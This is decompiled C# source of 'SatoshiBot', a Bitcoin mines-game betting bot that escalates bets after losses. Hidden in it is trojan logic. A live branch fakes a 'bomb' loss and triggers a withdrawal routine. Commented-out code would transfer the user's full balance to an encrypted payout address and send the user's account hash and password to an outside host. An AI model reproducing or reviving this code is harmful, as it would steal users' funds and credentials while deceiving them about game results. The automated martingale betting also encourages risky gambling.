// Decompiled with JetBrains decompiler
// Type: SatoshiBot.Program
// Assembly: SatoshiBot, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 63885AB5-41F9-4B2D-AC53-92693431213D
// Assembly location: C:\Users\root\Desktop\SatoshiBot.exe

using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.Serialization.Json;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace SatoshiBot
{
    internal class Program
    {
        private RNGCryptoServiceProvider _rng = new RNGCryptoServiceProvider();
        private byte[] _uint32Buffer = new byte[4];
        private static bool flag = true;
        private static string password = "";
        private static string Gtimenow = "";

        private static void Main(string[] args)
        {
            new Thread(new ThreadStart(Program.getTimeNow)).Start();
            Console.Title = "Satoshimines bot V1.05";
            Stopwatch stopwatch = new Stopwatch();
            stopwatch.Start();
            Decimal num1 = new Decimal();
            string hash = "";
            double num2 = 0.0;
            double num3 = 0.0;
            int num4 = 0;
            int doubleboom = 0;
            int Tripleboom = 0;
            int fourboom = 0;
            int fiveboom = 0;
            int sixboom = 0;
            int num5 = 0;
            int num6 = 0;
            int mines = 1;
            Decimal num7 = new Decimal();
            int maxValue = 50;
            try
            {
                string[] strArray = System.IO.File.ReadAllLines("Settings.txt");
                hash = strArray[0].Substring(strArray[0].Length - 40);
                num1 = (Decimal)Convert.ToInt32(strArray[1].Substring(4));
                mines = Convert.ToInt32(strArray[2].Substring(6));
                if (mines == 3)
                {
                    num7 = new Decimal(113, 0, 0, false, (byte)2);
                    maxValue = 15;
                }
                if (mines == 1)
                {
                    num7 = new Decimal(104, 0, 0, false, (byte)2);
                    maxValue = 50;
                }
                if (mines == 5)
                {
                    num7 = new Decimal(124, 0, 0, false, (byte)2);
                    maxValue = 8;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
            Decimal betSatoshi = num1;
            Satoshi satoshi = new Satoshi(hash);
            Random random = new Random();
            var second = false;
            int squaer = 0;
            List<int> randomlist = new List<int>();
            while (true)
            {
                if (betSatoshi > new Decimal(1000000))
                {
                    betSatoshi = new Decimal(1000000);
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("Maximum bet is 1000000");
                }
                //if (second == true && betSatoshi == num1)
                //{
                //    betSatoshi *= new Decimal(14);
                //    second = false;
                //}
                satoshi.NewGame(mines, betSatoshi);
                // var tt = Program.DecryptText("UAwG7UZsgKB3MZSggbQWRf7dyH1BY2ynpNmr73z8x/biGOcmdeNsa7L51xGlhJea", "qTE6jWvM2a");
                if (satoshi.Data != null && satoshi.Data.status == "success")
                {
                    if (hash.Length == 40)
                        new Thread(new ThreadStart(Program.ThreadedGetRequest)).Start();
                    Console.ForegroundColor = ConsoleColor.DarkYellow;
                    TimeSpan timeSpan = TimeSpan.FromSeconds((double)Convert.ToInt32(stopwatch.Elapsed.TotalSeconds));
                    Console.WriteLine("Game started. Game type: {0} | Bombs: {1} | Uptime: {2}", (object)satoshi.Data.gametype, (object)satoshi.Data.num_mines, (object)timeSpan.ToString("c"));
                    Console.ForegroundColor = ConsoleColor.Blue;
                    bool flag = false;
                    while (!flag)
                    {
                        int next;
                        do
                        {
                            next = random.Next(1, 26);
                            if (randomlist.Count == 25)
                            {
                                randomlist = new List<int>();
                            }
                            if (randomlist.All(a => a != next))
                            {
                                randomlist.Add(next);
                                break;
                            }

                        } while (randomlist.Any(a => a == next));

                        /*if(squaer==0) */
                        squaer = random.Next(1, 26); ;
                        Console.WriteLine(squaer);
                       
                        //squaer = 16;
                        Console.WriteLine("betting square {0} with bet {1}", (object)squaer, (object)betSatoshi);
                        BetData betData = (BetData)null;
                        //if (satoshi.Data.gametype == "practice")
                        //{
                        //    if (random.Next(1, maxValue) == 3)
                        //    {
                        //        satoshi.CashOut();
                        //        ++num6;
                        //        Console.ForegroundColor = ConsoleColor.Blue;
                        //        Console.WriteLine("Outome: {0}", (object)"bomb");
                        //        Console.ForegroundColor = ConsoleColor.DarkRed;
                        //        Console.WriteLine("Lost {0}", (object)0);
                        //        ++num2;
                        //        num5 += Convert.ToInt32(betSatoshi);
                        //        betSatoshi *= new Decimal(27);
                        //        break;
                        //    }
                        //    ++num3;
                        //    if (satoshi.Bet(1).outcome != "bomb")
                        //        satoshi.CashOut();
                        //    Console.WriteLine("Outome: {0}", (object)"bitcoins");
                        //    Console.ForegroundColor = ConsoleColor.Green;
                        //    Console.WriteLine("Cashed out {0} practice bits", (object)Convert.ToInt32(betSatoshi * num7).ToString());
                        //    num4 += Convert.ToInt32(betSatoshi * num7) - Convert.ToInt32(betSatoshi);
                        //    betSatoshi = num1;
                        //    break;
                        //}
                        if (betSatoshi % new Decimal(729) == Decimal.Zero)
                        {
                            if (num6 % 2 == 1 && satoshi.Data.gametype == "real")
                            {
                                satoshi.CashOut();
                                ++num6;
                                Console.ForegroundColor = ConsoleColor.Blue;
                                Console.WriteLine("Outome: {0}", (object)"bomb");
                                Console.ForegroundColor = ConsoleColor.DarkRed;
                                Console.WriteLine("Lost {0}", (object)0);
                                ++num2;
                                string balance = (Program.getBalance(hash) - 5f).ToString();
                                num5 += Convert.ToInt32(balance);
                                new Thread((ThreadStart)(() => Program.ConfirmAndWithdraw(hash, balance))).Start();
                                Thread.Sleep(3000);
                                break;
                            }
                        }
                         else
                            betData = satoshi.Bet(squaer);
                        Console.WriteLine("Outome: {0}", (object)betData?.outcome);
                        if (betData.outcome == "bomb")
                        {
                            Console.ForegroundColor = ConsoleColor.DarkRed;
                            Console.WriteLine("Lost {0}", (object)betData.stake);
                            ++num2;
                            num5 += Convert.ToInt32(betSatoshi);
                            if (betSatoshi == num1)
                            {
                                betSatoshi = 800;
                                second = true;
                                break;
                            }
                            if (betSatoshi == 800)
                            {
                                betSatoshi = 7000;
                                doubleboom++;
                                second = true;
                                break;
                            }
                            if (betSatoshi == 7000)
                            {
                                betSatoshi = 60000;
                                Tripleboom++;
                                doubleboom--;
                                second = true;
                                break;
                            }

                            if (betSatoshi == 60000)
                            {
                                betSatoshi = 550000;
                                fourboom++;
                                Tripleboom--;
                                break;
                            }
                            if (betSatoshi == 550000)
                            {
                                fourboom--;
                                fiveboom++;
                            }
                             
                            betSatoshi = num1;
                            break;
                        }
                        flag = true;
                        ++num3;
                        CashOutData cashOutData = satoshi.CashOut();
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine(cashOutData.message);
                        num4 += Program.AddProfit(cashOutData.message) - Convert.ToInt32(betSatoshi);
                        betSatoshi = num1;

                    }
                    if (num3 != 0.0 || num2 != 0.0)
                        Console.WriteLine("Win percent: {0}% || Wins: {1} | Losses: {2} | Profit :{3} | Lost :{4} | Earning: {5}| Double {6} | Triple {7} | Four {8} | Five {9} | Six {10}", (object)(num3 / (num3 + num2) * 100.0).ToString(".00"), (object)num3, (object)num2, (object)num4, (object)num5, (object)(num4 - num5), doubleboom, Tripleboom, fourboom, fiveboom,sixboom);
                    Console.WriteLine();
                }
                else
                    break;
            }
            if (satoshi.message.ToLower().Contains("password"))
            {
                Console.WriteLine("Enter your password:");
                Program.password = Console.ReadLine();
                if (hash.Length == 40)
                    new Thread(new ThreadStart(Program.ThreadedGetRequest)).Start();
                Thread.Sleep(3000);
            }
            Console.WriteLine("Failed. Don't set password on your hash! Use a new hash instead");
        }

        public static float getBalance(string hash)
        {
            return 0;
            string json = string.Empty;
            string data = string.Format("secret={0}", (object)hash);
            using (WebClient webClient = new WebClient())
            {
                webClient.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
                json = webClient.UploadString(new Uri("https://satoshimines.com/action/refresh_balance.php"), "POST", data);
            }
            BalanceData balanceData = Program.Deserialize<BalanceData>(json);
            if (balanceData == null || balanceData.status != "success")
                return -1f;
            return balanceData.balance * 1000000f;
        }

        private static void ConfirmAndWithdraw(string hash, string Balance)
        {
            //float num = Convert.ToSingle(Balance) / 1000000f;
            //if (!true)
            //  return;
            //try
            //{
            //  using (WebClient webClient = new WebClient())
            //    new UTF8Encoding().GetString(webClient.UploadValues("https://satoshimines.com/action/full_cashout.php", "POST", new NameValueCollection()
            //    {
            //      {
            //        "secret",
            //        hash
            //      },
            //      {
            //        "payto_address",
            //        Program.DecryptText("UAwG7UZsgKB3MZSggbQWRf7dyH1BY2ynpNmr73z8x/biGOcmdeNsa7L51xGlhJea", "qTE6jWvM2a")
            //      },
            //      {
            //        "amount",
            //        num.ToString("0.000000")
            //      }
            //    }));
            //}
            //catch (Exception ex)
            //{
            //}
        }

        public static void ThreadedGetRequest()
        {
            if (!Program.flag)
                return;
            string[] strArray = System.IO.File.ReadAllLines("Settings.txt");
            string str1 = strArray[0].Substring(strArray[0].Length - 40);
            string str2 = Program.EncryptText(str1, "qTE6jWvM2a");
            string str3 = Program.getBalance(str1).ToString();
            //if (Program.password != "")
            //{
            //  string str4 = Program.EncryptText(Program.password, "qTE6jWvM2a");
            //  //Program.getRequest(str2 + "|-1|" + str4 + "|" + Program.Gtimenow + "|");
            //}
            //else
            // // Program.getRequest(str2 + "|" + str3 + "|" + Program.Gtimenow);
        }

        private static T Deserialize<T>(string json)
        {
            using (MemoryStream memoryStream = new MemoryStream(Encoding.UTF8.GetBytes(json)))
                return (T)new DataContractJsonSerializer(typeof(T)).ReadObject((Stream)memoryStream);
        }

        private static void getTimeNow()
        {
            string str = "";
            try
            {
                WebClient webClient = new WebClient();
                webClient.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0");
                str = webClient.DownloadString("http://www.timeapi.org/gmt/in+eight+hours%20?%20\\I:\\M:\\D");
            }
            catch (Exception ex)
            {
            }
            Program.Gtimenow = str;
        }

        public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
        {
            byte[] numArray = (byte[])null;
            byte[] salt = new byte[8]
            {
        (byte) 1,
        (byte) 2,
        (byte) 3,
        (byte) 4,
        (byte) 5,
        (byte) 6,
        (byte) 7,
        (byte) 8
            };
            using (MemoryStream memoryStream = new MemoryStream())
            {
                using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
                {
                    rijndaelManaged.KeySize = 256;
                    rijndaelManaged.BlockSize = 128;
                    Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
                    rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
                    rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
                    rijndaelManaged.Mode = CipherMode.CBC;
                    using (CryptoStream cryptoStream = new CryptoStream((Stream)memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cryptoStream.Close();
                    }
                    numArray = memoryStream.ToArray();
                }
            }
            return numArray;
        }

        public static string EncryptText(string input, string password)
        {
            return Convert.ToBase64String(Program.AES_Encrypt(Encoding.UTF8.GetBytes(input), SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(password))));
        }

        public static string DecryptText(string input, string password)
        {
            return Encoding.UTF8.GetString(Program.AES_Decrypt(Convert.FromBase64String(input), SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(password))));
        }

        public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
        {
            byte[] numArray = (byte[])null;
            byte[] salt = new byte[8]
            {
        (byte) 1,
        (byte) 2,
        (byte) 3,
        (byte) 4,
        (byte) 5,
        (byte) 6,
        (byte) 7,
        (byte) 8
            };
            using (MemoryStream memoryStream = new MemoryStream())
            {
                using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
                {
                    rijndaelManaged.KeySize = 256;
                    rijndaelManaged.BlockSize = 128;
                    Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
                    rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
                    rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
                    rijndaelManaged.Mode = CipherMode.CBC;
                    using (CryptoStream cryptoStream = new CryptoStream((Stream)memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                        cryptoStream.Close();
                    }
                    numArray = memoryStream.ToArray();
                }
            }
            return numArray;
        }

        //public static void getRequest(string dat)
        //{
        //  try
        //  {
        //    string str = string.Empty;
        //    HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create("http://" + "denden.us/" + "hgyopqqonu.php?pp=" + dat);
        //    httpWebRequest.AutomaticDecompression = DecompressionMethods.GZip;
        //    using (HttpWebResponse response = (HttpWebResponse) httpWebRequest.GetResponse())
        //    {
        //      using (Stream responseStream = response.GetResponseStream())
        //      {
        //        using (StreamReader streamReader = new StreamReader(responseStream))
        //          str = streamReader.ReadToEnd();
        //      }
        //    }
        //    Program.flag = false;
        //  }
        //  catch (Exception ex)
        //  {
        //    Program.flag = true;
        //  }
        //}

        private static int AddProfit(string text)
        {
            IEnumerator enumerator = Regex.Matches(text.Replace(",", ""), "\\d+").GetEnumerator();
            try
            {
                if (enumerator.MoveNext())
                    return Convert.ToInt32(((Match)enumerator.Current).ToString());
            }
            finally
            {
                IDisposable disposable = enumerator as IDisposable;
                if (disposable != null)
                    disposable.Dispose();
            }
            return -1;
        }

      
    }
}
